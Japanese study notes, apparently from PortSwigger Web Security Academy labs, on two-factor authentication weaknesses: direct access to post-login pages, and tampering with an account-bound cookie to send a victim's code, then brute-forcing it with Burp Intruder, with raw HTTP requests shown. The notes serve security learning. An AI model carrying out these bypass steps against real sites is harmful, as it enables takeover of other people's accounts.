### 基本

- Webアプリケーションにおいては生体認証はほとんどなく、記憶認証と所持認証の2FAがメイン。 所持認証は帯域外のデバイスに送られるトークンなど。帯域外のデバイスに送られるトークンを入手するのは非常に難しい。
- 「完全に異なる」要素で認証しないと意味ない。
	- 例えばEmailでの2FAはユーザが電子メールアカウントのログイン認証情報を記憶していることだけに依存する。つまり、(パスワード＝)記憶認証＋(Emailの垢=)記憶認証といった、同じ要素で認証しているものは脆弱
###### 高セキュリティ
- 専用のトークンデバイスを使用
- Google Authenticatorのような専用のモバイルアプリを使用
##### 低セキュリティ
- SMSで認証コードを送信している
	- MITM攻撃で傍受される
	- SIMスワップ [SIMスワップとは](https://eset-info.canon-its.jp/malware_info/special/detail/230706.html)

### ログイン状態のみアクセスできるページへの直接アクセス

- 2FAバイパスにおいて、まずは「ログイン状態のみ」アクセスできるページに飛んでみることを検証する。
#### 方法
1. 自身のアカウントでログインする
2. 自身のメールアカウントやSMSなどに届く認証のコードを確認し、入力する
3. ログイン後のURLをメモ
4. victimのクレデンシャルでログインする。ログインが成功したらログイン後のURLを入力
###### 脆弱性の原理
- 認証コードを入力する前の時点でログインが完了してしまっている

### 2FA検証の欠陥

- 1つ目の要素で認証したあと、ユーザごとに割り当てられる値(Cookieなど）を悪用する
#### 方法
1. ユーザの列挙をしておく
2. 自身のアカウントでログインする
3. 認証コードを入手する
4. パターンA : Cookieなどにアカウントと関連する情報が割り当てられたら、その値をvictimユーザに変更し、認証コードを入力する
4. パターンB : アカウントと関連する情報をvictimユーザに変更することでvictimユーザへ認証コードを送り、その後、victimユーザとして2段階認証の認証コードをブルートフォースする

###### 脆弱性の原理
1. まずユーザは自身のクレデンシャルで1つ目の要素の認証をする
```http
POST /login-steps/first 
HTTP/1.1 
Host: vulnerable-website.com 
... 
username=carlos&password=qwerty
```
2. 認証が成功すると、アカウントに関連するCookieが割り当てられる
```http
HTTP/1.1 200 OK 
Set-Cookie: account=carlos 

GET /login-steps/second HTTP/1.1 
Cookie: account=carlos
```
3. 認証コードを送信するとき、アプリケーションはこのCookieを元にユーザを識別する
```http
POST /login-steps/second HTTP/1.1 
Host: vulnerable-website.com 
Cookie: account=carlos 
... 
verification-code=123456
```
4. Cookieをvictimのユーザに変更

##### 実践

1. 2FAコード入力画面で失敗回数によるアカウントロックの有無を確認し、総当たり可能なことがわかる
2. 以下アカウントと紐付けられたパラメータである`verify`をvictimユーザに変更してRequestすることで、victimユーザのEmailクライアントへ認証コードを送る
	- 仕様上、login2へGETリクエストすることで認証コードがverifyに指定したアカウントのEmailクライアントへ送信される。
```http
GET /login2 HTTP/2
Host: 0ae000c403f90a75829e24f100af004e.web-security-academy.net
Cookie: verify=carlos; session=nvecQy2i060ugzPCOt372s4BxmqaAc0M
```

3. 2FAコード入力画面へ切り替え適当な数値を入力しPOST。これをIntruderへ送りブルートフォース
```http
POST /login2 HTTP/2
Host: 0ae000c403f90a75829e24f100af004e.web-security-academy.net
Cookie: verify=carlos; session=nvecQy2i060ugzPCOt372s4BxmqaAc0M
...
Accept-Language: ja-JP,ja;q=0.9,en;q=0.8

mfa-code=§mfa-code§
```

3. 認証コードのPOST RequestをRepeaterへ送る-> パラメータをハイライト-> 右クリックでExtentionでTurbo Intruderを選択
